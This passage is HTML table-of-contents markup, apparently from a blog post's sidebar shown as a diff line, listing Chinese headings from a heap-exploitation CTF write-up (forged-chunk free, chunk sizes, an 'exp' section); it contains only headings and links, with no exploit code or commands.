class="toc-link" href="#exp"><span class="toc-number">5.</span> <span class="toc-text">exp</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%B8%8D%E5%A4%AA%E6%87%82%E4%B8%BA%E4%BB%80%E4%B9%88%E4%BC%AA%E9%80%A0%E7%9A%84%E5%A0%861-free%E4%B8%8D%E4%BC%9A%E6%8A%A5%E9%94%99"><span class="toc-number">1.</span> <span class="toc-text">这里不太懂为什么伪造的堆1 free不会报错</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%87%B3%E4%BA%8E%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BDshow%EF%BC%8C%E4%B9%9F%E6%98%AF%E6%8C%BA%E5%A5%87%E6%80%AA%E7%9A%84%EF%BC%8C%E5%9B%A0%E4%B8%BA%E5%9C%A8show%E5%87%BD%E6%95%B0%E9%82%A3%E9%87%8C%E9%99%90%E5%88%B6%E4%BA%86%E5%A4%A7%E5%B0%8F%EF%BC%8C%E5%8F%96%E7%9A%84%E6%98%AF%E5%8E%9F%E6%9D%A5%E7%9A%84%E5%A4%A7%E5%B0%8F"><span class="toc-number">2.</span> <span class="toc-text">至于为什么能show，也是挺奇怪的，因为在show函数那里限制了大小，取的是原来的大小</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%A5%87%E6%80%AA%EF%BC%8C%E8%BF%99%E9%87%8C%E5%86%8D%E7%94%B3%E8%AF%B70x80%E7%9A%84%E5%A4%A7%E5%B0%8F%EF%BC%8C%E7%84%B6%E5%90%8Esize%E8%BF%98%E6%98%AF0xa1"><span class="toc-number">2.1.</span> <span class="toc-text">奇怪，这里再申请0x80的大小，然后size还是0xa1</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%BF%99%E9%87%8C%E4%B9%9F%E4%B8%8D%E5%A4%AA%E6%87%82%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E8%BF%99%E6%A0%B7%E5%86%99-%E5%90%8E%E9%9D%A2%E7%9A%84p64-0x70-p64-0x21"><span class="toc-number">2.2.</span> <span class="toc-text">这里也不太懂为什么要这样写,后面的p64(0x70)+p64(0x21)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%8D%E8%BF%87%E6%9C%80%E5%90%8E%E7%9A%84%E8%AF%9D%EF%BC%8C%E6%98%AF%E6%89%93%E4%B8%8D%E9%80%9A%E7%9A%84%E3%80%82"><span class="toc-number">2.3.</span> <span class="toc-text">不过最后的话，是打不通的。</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#exp"><span class="toc-number">2.4.</span> <span class="toc-text">exp</span></a></li></ol></li></ol>
                     </div>
                 </span>
             </div>
